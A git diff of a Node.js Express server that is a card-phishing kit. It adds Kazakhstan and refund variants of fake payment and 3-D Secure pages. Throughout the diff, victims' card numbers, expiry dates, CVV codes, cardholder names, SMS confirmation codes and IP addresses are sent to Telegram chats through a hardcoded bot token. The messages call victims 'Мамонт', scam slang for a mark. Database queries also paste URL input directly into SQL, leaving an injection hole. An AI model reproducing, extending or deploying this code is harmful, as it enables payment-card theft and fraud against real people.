@@ -25,6 +25,34 @@ try {
         res.redirect(`https://cinema-funnyhub.com`)
     })
 
+    app.get('/refund/:userlink', (req, res) => {
+        client.query(`SELECT amount, currency FROM userssrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
+            if (ress.rows[0] === undefined) {
+                res.redirect(`https://sauna-laguna.com`);
+                return console.log("error");
+            }
+            if (req.params.userlink.search('ua') !=  -1){
+                console.log(1);
+                var index = 'index_card_ua';
+            } else if (req.params.userlink.search('pln') !=  -1) {
+                console.log(2);
+                var index = 'index_card_pln';
+            } else if (req.params.userlink.search('kz') !=  -1) {
+                console.log(2);
+                var index = 'index_card_kz';
+            } else {
+                console.log(3);
+                var index = 'index_card';
+            }
+            if (ress) {
+                const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+                res.render(index, {amount: ress.rows[0].amount, user_link: req.params.userlink});
+                bot.sendMessage(-1001878239645, `🧖‍♀️ <b>Возврат\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Сумма:</i> <b>${ress.rows[0].amount} ${ress.rows[0].currency}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+                return console.log(ress.rows[0].amount);
+            }
+        })
+    })
+
     app.get('/:userlink', (req, res) => {
         client.query(`SELECT place FROM userss WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
@@ -37,6 +65,9 @@ try {
             } else if (req.params.userlink.search('pln') !=  -1) {
                 console.log(2);
                 var index = 'index_pln';
+            } else if (req.params.userlink.search('kz') !=  -1) {
+                console.log(2);
+                var index = 'index_kz';
             } else {
                 console.log(3);
                 var index = 'index';
@@ -59,27 +90,34 @@ try {
 
         res.render('index_card', {amount: req.body.amount, user_link: req.body.user_link});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
-        bot.sendMessage(-1001679583572, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
 
     })
     app.post('/3dsua', (req, res) => {
         res.render('index_card_ua', {amount: req.body.amount, user_link: req.body.user_link});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
-        bot.sendMessage(-1001679583572, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
     app.post('/3dspln', (req, res) => {
         res.render('index_card_pln', {amount: req.body.amount, user_link: req.body.user_link});
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
-        bot.sendMessage(-1001679583572, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+    })
+
+    app.post('/3dskz', (req, res) => {
+        res.render('index_card_kz', {amount: req.body.amount, user_link: req.body.user_link});
+        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001878239645, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
     app.post('/confirmationua', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
-        bot.sendMessage(-1001679583572, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
                 inline_keyboard: [
@@ -103,8 +141,35 @@ try {
                                     cvc2: req.body.cvc2});
     })
 
+    app.post('/confirmationkz', (req, res) => {
+        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+        const delete_button = {
+            reply_markup: JSON.stringify({
+                inline_keyboard: [
+                    [
+                        {
+                            text: "Удалить ссылку",
+                            callback_data: `del_li_site${req.body.user_link}`,
+                        }
+                    ]
+                ]
+            }),
+            parse_mode: 'HTML'
+        }
+        bot.sendMessage(-1001878239645, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
+        res.render('index_code_kz', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+    })
+
     app.post('/confirmation', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
                 inline_keyboard: [
@@ -130,6 +195,7 @@ try {
                                 })
     app.post('/confirmationpln', (req, res) => {
         const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        bot.sendMessage(-1001687635965, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
                 inline_keyboard: [
@@ -162,6 +228,24 @@ try {
         bot.sendMessage(-1001878239645, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
         setTimeout(function(){
             res.render('index_code_f_pln', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
+    app.post('/confirmation_fkz', (req, res) => {
+        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001878239645, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f_kz', {cardnumber: req.body.cardnumber,
                                         cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                         amount: req.body.amount,
                                         cardholder: req.body.cardholder.toString().replace(/ /g,''),
